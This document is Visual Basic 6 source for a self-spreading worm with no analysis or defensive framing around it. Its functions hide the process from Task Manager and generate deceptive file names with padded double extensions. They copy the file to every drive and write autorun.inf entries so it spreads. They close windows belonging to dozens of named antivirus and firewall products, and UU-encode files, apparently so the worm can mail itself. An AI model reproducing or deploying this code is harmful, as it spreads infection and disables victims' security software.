   Attribute VB_Name = "Module1"
   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
   Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
   Declare Function PostMessage Lib "USER32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Declare Function EnumWindows Lib "USER32" (ByVal lpfn As Long, lParam As Any) As Boolean
   Declare Function GetWindowText Lib "USER32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
   Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
   Private Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

   Const WM_CLOSE = &H10

   Dim a As Long
   Dim b As Long

   Function removefromCAD()
   Dim ProcID As Long
       Dim Rtrn As Long

       ProcID = GetCurrentProcessId()
       Rtrn = RegisterServiceProcess(ProcID, 1)
   End Function

   Function RegExists(RegKey As String) As String
   On Error GoTo ErrorCase

      Set WinScr = CreateObject("Wscript.Shell")
      RegExists = WinScr.RegRead(RegKey)
      Exit Function

   ErrorCase:
   RegExists = "bl0wPHISH"
   End Function

   Function RegistryWrite(ByVal Key As String, ByVal Value As String) As String
   On Error GoTo ErrorCase

   Set WinScr = CreateObject("Wscript.Shell")
   RegistryWrite = WinScr.RegWrite(Key, Value)
   Exit Function

   ErrorCase:
   RegistryWrite = "bl0wPHISH"
   End Function

   Function NumGen(low As Integer, high As Integer)
       Randomize
       NumGen = Int(low + (high - low + 1) * Rnd)
   End Function

   Function RanName()

   File = Array("Windows", "System", "Registry", "Microsoft", _
   "Command", "Win32", "Windows32", "MSConfig", "MSRAMDrive", "Internet" _
   , "Defrag", "Clean", "SYS", "Statistic", "File", "DOS", "PROMPT" _
   , "Jimi_Hendrix", "Bob_Marley", "The_Pixies", "The_Doors", "REM")

   file2 = Array("DLL", "dll", "Load", "Handle", "Scan", "Agent", "Config" _
   , "Settings", "SYS", "Driver", "_32", "monitor", "reg", "Manager")

   Num = Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9" _
   , "_0", "_1", "_2", "_3", "_4", "_5", "_6", "_7", "_8", "_9")

   Ext = Array(".exe", ".scr", ".zip      .scr        .exe", ".bat           .exe", ".sys          .exe" _
   , ".dll         .exe", ".sys           .scr", ".dll         .exe", ".zip.exe")

   NamePart0 = File(NumGen(0, UBound(File)))
   NamePart1 = file2(NumGen(0, UBound(file2)))
   NamePart2 = Num(NumGen(0, UBound(Num))) & Num(NumGen(0, UBound(Num))) & Num(NumGen(0, UBound(Num)))
   NamePart3 = Ext(NumGen(0, UBound(Ext)))

   RanName = NamePart0 & NamePart1 & NamePart2 & NamePart3

   End Function

   Function Inf_Drives(ByVal FileName As String, CopyName As String)
    On Error Resume Next
       Set fs = CreateObject("scripting.filesystemobject")

       For Each d In fs.drives

       Dest = d & "\"

           FileCopy FileName, Dest & CopyName

       If FileExists(Dest & "autorun.inf") Then
          Set autoRun = fs.CreateTextFile(Dest & "autorun.inf", True)
          autoRun.Write "[autorun]" & vbCrLf & "open=" & Dest & CopyName
          autoRun.Close
        End If

       Next

   End Function

   Public Function FileExists(strPath As String) As Boolean
   Dim Exist As Integer

     If PathFileExists(strPath) = 1 Then
       FileExists = True
    Else
       FileExists = False
     End If

   End Function

   Public Function EnumWindowsProc(ByVal hwnd As Long, ByVal lParam As Long) As Long
     Dim slength As Long, buffer As String
     Dim retval As Long
     Dim a As Long
     Dim b As Long

   AntiVir = Array("norton", "sophos", "symantec", "trend", "blackice", "mcafee", "kaspersky", "panda" _
   , "solo", "zonealarm", "sygate", "pccillin", "pc-cillin", "norman", "anti", "trojan", "avg", "avx" _
   , "bitdefender", "f-prot", "e-safe", "f-secure", "avast!", "etrust", "doctor", "nod32", "virobot", "grisoft" _
   , "protector", "Sybari", "Antigen", "scan", "guarder", "anti", "firewall", "fix")

     slength = GetWindowTextLength(hwnd) + 1

       buffer = Space(slength)
       retval = GetWindowText(hwnd, buffer, slength)
       VirTitle = Left(buffer, slength - 1)

    For i = 0 To UBound(AntiVir)
     If InStr(LCase(VirTitle), AntiVir(i)) <> 0 Then
       a = FindWindow(vbNullString, VirTitle)
       b = PostMessage(a, WM_CLOSE, vbNull, vbNull)
     End If
    Next

     EnumWindowsProc = 1

   End Function

   Public Function UUEncodeFile(ByVal strFilePath As String) As String

       Dim intFile         As Integer
       Dim intTempFile     As Integer
       Dim lFileSize       As Long
       Dim strFileName     As String
       Dim strFileData     As String
       Dim lEncodedLines   As Long
       Dim strTempLine     As String
       Dim i               As Long
       Dim j               As Integer

       Dim strResult       As String
       strFileName = Mid$(strFilePath, InStrRev(strFilePath, "\") + 1)
       lFileSize = FileLen(strFilePath)
       lEncodedLines = lFileSize \ 45 + 1
       strFileData = Space(45)
       intFile = FreeFile
       Open strFilePath For Binary As intFile
           For i = 1 To lEncodedLines
               If i = lEncodedLines Then
                   strFileData = Space(lFileSize Mod 45)
               End If
               Get intFile, , strFileData
               strTempLine = Chr(Len(strFileData) + 32)
               If i = lEncodedLines And (Len(strFileData) Mod 3) Then
                   strFileData = strFileData + Space(3 - (Len(strFileData) Mod 3))
               End If

               For j = 1 To Len(strFileData) Step 3
                   strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j, 1)) \ 4 + 32)
                   strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j, 1)) Mod 4) * 16 _
                                  + Asc(Mid(strFileData, j + 1, 1)) \ 16 + 32)
                   strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j + 1, 1)) Mod 16) * 4 _
                                  + Asc(Mid(strFileData, j + 2, 1)) \ 64 + 32)
                   strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j + 2, 1)) Mod 64 + 32)
               Next j
               strTempLine = Replace(strTempLine, " ", "`")
               strResult = strResult + strTempLine + vbLf
               strTempLine = ""
           Next i
       Close intFile

       strResult = strResult & "`" & vbLf + "end" + vbLf
       UUEncodeFile = strResult

   End Function
